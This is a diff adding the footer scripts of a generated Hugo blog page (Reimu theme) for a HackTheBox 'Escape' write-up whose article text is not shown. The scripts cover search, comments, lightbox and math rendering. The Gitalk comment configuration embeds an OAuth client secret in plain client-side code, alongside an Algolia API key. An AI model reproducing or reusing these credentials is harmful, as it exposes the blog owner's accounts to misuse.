+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Escape",
+          url: "http:\/\/localhost:1313\/post\/htb-escape\/",
+          description: "HackTheBox篇ADCS系列之Escape",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
